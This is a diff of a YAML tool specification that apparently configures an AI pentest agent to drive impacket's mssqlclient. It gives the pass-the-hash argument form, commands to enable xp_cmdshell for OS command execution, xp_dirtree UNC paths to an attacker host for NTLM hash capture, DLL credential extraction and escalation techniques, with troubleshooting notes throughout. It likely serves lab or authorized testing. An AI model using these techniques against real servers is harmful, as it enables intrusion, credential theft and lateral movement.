+  - "Feature 28 dynamic recipes are RETIRED for the kind:cli path — the LLM writes argv directly. Recipes still load for legacy method calls (query, enum, xp_cmdshell, xp_dirtree, linked_query, extract_assembly, escalate) if /session/tool_recipes/mssql/ exists, but they're a dead branch under run_cli (REQ-TR-016)."
+  - "-hashes IMPLIES -no-pass — the legacy mcp-server.py auto-appended `-no-pass` whenever `-hashes` was set (line 202). When constructing argv directly, the agent MUST pass `-no-pass` alongside `-hashes :NTHASH -windows-auth`. Without `-no-pass`, mssqlclient prompts for a password on stdin and the container hangs (idle_timeout=300s catches it but is slow). Canonical PtH form: `-hashes :NTHASH -windows-auth -no-pass`."
+  - "xp_cmdshell OUTPUT IS INTERLEAVED WITH SQL OVERHEAD — the `EXEC xp_cmdshell '<cmd>'` row stream contains: a header line with the column name (`output`), then one line per stdout line of the OS command, then the `(N rows affected)` footer. The legacy mcp-server.py extracted command output by skipping lines until it saw `xp_cmdshell` then capturing subsequent non-`[`/non-`SQL` lines (lines 416-426). When parsing kind:cli output directly: discard rows that are SQL-overhead markers (`SQL>`, `SQL (...)`, lines starting with `[`, separator dashes, `Impacket vN.N` banner) and capture the body rows. Use `-no-row-count` to drop the footer cleanly."
+  - "EXTRACTED ASSEMBLY HEX → DLL VIA xxd — `sys.assembly_files.content` is rendered as a hex blob in the result table. Decode with: `echo '<hex_no_0x_prefix>' | xxd -r -p > assembly.dll`. The leading `0x` from MSSQL's varbinary representation must be stripped before xxd. ilspy / dnSpy then decompiles the DLL to surface hardcoded credentials, business logic, or further attack surface."
+  - "-command IS A THIRD NON-INTERACTIVE FORM (besides -file and stdin) — mssqlclient.py supports a `-command <sql>` flag that runs an inline statement, repeatable for multi-statement runs (legacy mcp-server.py used `-command` exclusively, see lines 204-206). Form: `mssqlclient.py '...@host' -windows-auth -command 'SELECT @@VERSION;' -command 'SELECT SYSTEM_USER;'`. Less common than -file in practice (the agent normally prefers writing SQL to /session/<name>.sql for auditability), but viable when the query is short and a temp file is undesirable. Like -file, mixing -command with stdin or with -file produces undefined ordering — pick one mechanism per call."
+  - "BACKSLASH `DOMAIN\\user` USERNAME FORM IS NOT NATIVE TO IMPACKET — the canonical positional form is `DOMAIN/user[:password]@host` (forward slash). Some operators paste `DOMAIN\\user:p@host` from cmd.exe / PowerShell muscle memory; the legacy mcp-server.py let it through (line 182 detects either `\\` or `/`), but mssqlclient's argparse/positional parser may or may not accept it depending on impacket version. SAFEST: convert to forward-slash form before invoking. The target_extraction regex documented here only matches the forward-slash form; backslash-form invocations will fall through to the -dc-ip / -target-ip fallback rules, which is wrong if the agent meant the positional host."
 
-  xp_cmdshell:
-    description: "Execute OS commands via MSSQL xp_cmdshell. Automatically enables xp_cmdshell if disabled (requires sysadmin)."
-    when_to_use: "When you have sysadmin access to MSSQL and need RCE. Enables xp_cmdshell via sp_configure, then executes the command. Common first commands: 'whoami', 'hostname', 'ipconfig'."
-    params:
-      host:
-        type: string
-        required: true
-        description: "MSSQL server hostname or IP."
-      username:
-        type: string
-        required: true
-        description: "Username (must be sysadmin)."
-      password:
-        type: string
-        description: "Password."
-      command:
-        type: string
-        required: true
-        description: "OS command to execute."
-    returns:
-      output:
-        type: string
-        description: "Command execution output."
+failure_signatures:
+  # Layer-diverse signals (SKILL #11) — at least 7 distinct verifiable layers:
+  #   1. DNS  2. TCP  3. NTLM auth  4. SQL Server auth  5. Kerberos
+  #   6. SQL semantic  7. Argument parsing  8. xp_cmdshell-disabled
+  - signal: "Could not resolve"
+    remediation: "DNS resolution failed for the host portion of the positional target. Verify hostname spelling, try IP literal, check container DNS (`/etc/resolv.conf`). On HTB/lab, ensure VPN tun0 is up and routes the target subnet."
+  - signal: "Name or service not known"
+    remediation: "DNS lookup failed (Linux gai_strerror form). Same root as 'Could not resolve'. Pass an IP to the positional instead of a hostname, or fix container DNS."
+  - signal: "[Errno -2] Name or service not known"
+    remediation: "Python-level DNS failure (impacket exits 0 even on this — pattern-match the signal, don't rely on exit code). Same fix: use IP or fix DNS."
+  - signal: "Connection refused"
+    remediation: "TCP refused — port 1433 (or specified -port) is closed or filtered. nmap-confirm port state (`nmap -p 1433 -sV <host>`); if filtered, suspect host firewall or external ACL. The MSSQL server may be on a non-default port (named instance with dynamic port, or hardened deploy on 1434/14330) — try `-instance <name>` (UDP/1434 SQL Browser) or scan with `nmap -p- --script=ms-sql-info`."
+  - signal: "[Errno 111] Connection refused"
+    remediation: "Same as 'Connection refused' — port is closed or filtered. Use nmap to confirm and find alternative ports."
+  - signal: "Connection error"
+    remediation: "Generic impacket connect-error wrapper. Read the trailing parenthetical for the underlying cause (`Connection error (host:port: [Errno N] reason)`). Common causes: TCP refused, host unreachable, TLS handshake failure with -k."
+  - signal: "timed out"
+    remediation: "TCP / RPC timeout (impacket reports as 'Connection error (host:port): timed out'). Target may be slow, filtered, or down. Verify with nmap -p 1433 and check VPN routing. mssqlclient has no -timeout flag; rely on kernel default (~75s) or wrap in a larger run_cli timeout."
+  - signal: "Login failed"
+    remediation: "MSSQL authentication failure. Causes: (a) wrong password / hash for the login, (b) `-windows-auth` missing for an AD account (mssqlclient defaulted to SQL Server Auth), (c) `-windows-auth` set for a SQL login (mssqlclient tried NTLM against a login-based account). Verify auth path: domain account → -windows-auth; sa/dba/login → no -windows-auth."
+  - signal: "STATUS_LOGON_FAILURE"
+    remediation: "NTLM-layer auth failure (when -windows-auth is set). Same root as 'Login failed' but reported by the NTLM layer before SQL Server gets the request. Verify [domain/]user format, password / hash correctness, and that the user is enabled / not locked out."
+  - signal: "28000"
+    remediation: "SQL Server SQLSTATE for authentication failure (28000 = invalid authorization specification). Synonym for 'Login failed' from the SQL state perspective."
+  - signal: "KDC_ERR_PREAUTH_FAILED"
+    remediation: "Kerberos preauth failure when -k is set. Wrong password / hash for getTGT (which would have failed earlier), OR the ccache at KRB5CCNAME is from a different user / realm. Re-run impacket-getTGT to refresh, ensure KRB5CCNAME points to the correct file."
+  - signal: "KRB_AP_ERR_SKEW"
+    remediation: "Clock skew >5min between attacker and DC. Sync host clock (chronyc / rdate) — the kind:cli image has NO libfaketime workaround. As a fallback, get a TGT from a clock-synced source and pass via KRB5CCNAME, OR skip Kerberos and use -hashes pass-the-hash."
+  - signal: "KDC_ERR_S_PRINCIPAL_UNKNOWN"
+    remediation: "Service principal not found for MSSQL. The SPN MSSQLSvc/<host>:<port> must be registered in AD for Kerberos to work. Try -target-ip with the IP if the FQDN doesn't have a registered SPN. Verify with `setspn -L <svc_account>` against the DC, or use ldapsearch."
+  - signal: "Msg 208"
+    remediation: "SQL Server error 208 — invalid object name. Table / view / sproc doesn't exist OR the auth user lacks SELECT permission on it (returns 208 to obscure existence). `SELECT name FROM sys.tables` to confirm table presence, `SHOW GRANTS` equivalent: `SELECT * FROM sys.database_permissions WHERE grantee_principal_id = USER_ID()`."
+  - signal: "Msg 229"
+    remediation: "SQL Server error 229 — permission denied on object. Distinct from 208 (invalid object); the object exists but the user lacks the required permission (SELECT, EXECUTE, UPDATE). Request the privilege if you control the grant chain, or escalate via impersonation / trustworthy DB."
+  - signal: "Msg \\d+, Level \\d+"
+    remediation: "Generic SQL Server error format. Read the message number and level for severity (Level 16 = user-correctable, Level 20+ = fatal). Message numbers map to specific causes (208 = invalid object, 229 = permission denied, 245 = type conversion failed, 4060 = cannot open database). Reference: https://learn.microsoft.com/sql/relational-databases/errors-events/database-engine-events-and-errors."
+  - signal: "Incorrect syntax"
+    remediation: "T-SQL syntax error in the -file query. Read the prior log line for the line number / column position. Common pitfalls: missing semicolons between statements (some MSSQL versions require GO instead), single quotes inside strings need doubling (`'don''t'`), reserved words used as column names without `[brackets]`."
+  - signal: "must enable xp_cmdshell"
+    remediation: "xp_cmdshell is disabled on this server. Run the three-statement enable sequence first: `EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`. Requires sysadmin (the configure / reconfigure calls). If not sysadmin, escalate first via impersonation / trustworthy DB."
+  - signal: "is not a recognized option"
+    remediation: "sp_configure target option doesn't exist OR advanced options aren't enabled. Confirm with `EXEC sp_configure;` (no args) to list all options. The 'show advanced options' must be set to 1 BEFORE 'xp_cmdshell' is settable."
+  - signal: "error: argument"
+    remediation: "argparse — invalid argument or missing required value. mssqlclient uses argparse like the rest of impacket; common errors: missing positional target, -hashes value missing leading colon, -port value not numeric, -instance and -port both supplied. Run `mssqlclient.py --help` to see the exact flag spec."
+  - signal: "the following arguments are required"
+    remediation: "argparse — missing positional. mssqlclient requires the `[domain/]user[:password]@host` positional. If your invocation has no positional, supply one (or check for a typo that ate it)."
+  - signal: "unrecognized arguments"
+    remediation: "argparse — unknown flag. Check dashes (mssqlclient uses single-dash for short forms — `-port`, `-windows-auth`, `-hashes`; NOT `--port` / `--windows-auth`). Common typo: `--windows-auth` (double dash) is REJECTED — must be `-windows-auth` (single dash). impacket convention differs from GNU long-flag norm."
 
-  xp_dirtree:
-    description: "Use xp_dirtree to list directory contents or trigger NTLM authentication. When given a UNC path (\\\\attacker_ip\\share), the MSSQL service account authenticates to the attacker, leaking its Net-NTLMv2 hash."
-    when_to_use: "Two uses: (1) File enumeration — list files on the MSSQL server filesystem. (2) NTLM relay — provide a UNC path pointing to your responder/ntlmrelayx to capture the service account hash."
-    params:
-      host:
-        type: string
-        required: true
-        description: "MSSQL server hostname or IP."
-      username:
-        type: string
-        required: true
-        description: "Username."
-      password:
-        type: string
-        description: "Password."
-      path:
-        type: string
-        required: true
-        description: "Path to list (C:\\Users) or UNC path for NTLM capture (\\\\attacker_ip\\share)."
-    returns:
-      entries:
-        type: array
-        description: "Directory entries."
-      is_unc:
-        type: boolean
-        description: "Whether a UNC path was used (NTLM trigger)."
+help_commands:
+  - command: "mssqlclient.py --help"
+    purpose: "Top-level help — lists all flags including auth (-windows-auth/-k/-no-pass/-hashes/-aesKey), targeting (-port/-target-ip/-dc-ip/-instance), query (-file/-db), and output (-debug/-show/-row-count/-no-row-count). impacket convention is single-dash short flags throughout."
+  - command: "mssqlclient.py -h"
+    purpose: "Shortcut for --help (impacket binaries support both forms). NB: this is the HELP form — `-h` does NOT mean 'host' on impacket binaries (host comes from the positional `@host`). Different convention from mysql / curl / nmap."
 
-  linked_query:
-    description: "Execute a SQL query through a linked MSSQL server via OPENQUERY. Used for lateral movement between linked SQL instances."
-    when_to_use: "After enum discovers linked servers — query data on the linked instance or attempt to escalate via double-hop (linked server that links back with higher privileges)."
-    params:
-      host:
-        type: string
-        required: true
-        description: "MSSQL server to connect to."
-      username:
-        type: string
-        required: true
-        description: "Username."
-      password:
-        type: string
-        description: "Password."
-      linked_server:
-        type: string
-        required: true
-        description: "Linked server name."
-      sql:
-        type: string
-        required: true
-        description: "SQL query for the linked server."
-    returns:
-      rows:
-        type: array
-        description: "Query results from the linked server."
-
-  extract_assembly:
-    description: "Extract CLR assembly DLLs stored in MSSQL sys.assembly_files. These DLLs often contain hardcoded credentials or business logic."
-    when_to_use: "After enum discovers assemblies — extract the DLL content, decode from hex, then decompile with ilspy to find credentials."
-    params:
-      host:
-        type: string
-        required: true
-        description: "MSSQL server."
-      username:
-        type: string
-        required: true
-        description: "Username."
-      password:
-        type: string
-        description: "Password."
-      assembly_name:
-        type: string
-        description: "Assembly name to extract. Omit to list all assemblies."
-    returns:
-      results:
-        type: array
-        description: "Assembly data (name + hex content if specific assembly requested)."
-
-  escalate:
-    description: "Attempt MSSQL privilege escalation via impersonation (EXECUTE AS LOGIN), trustworthy database abuse, or linked server double-hop."
-    when_to_use: "When current user is not sysadmin but needs to escalate. impersonate: check and use IMPERSONATE permission. trustworthy: abuse databases with TRUSTWORTHY ON. linked_hop: find linked server double-hops with higher privileges."
-    params:
-      host:
-        type: string
-        required: true
-        description: "MSSQL server."
-      username:
-        type: string
-        required: true
-        description: "Username."
-      password:
-        type: string
-        description: "Password."
-      technique:
-        type: string
-        default: "impersonate"
-        description: "Technique: impersonate, trustworthy, linked_hop."
-    returns: {}
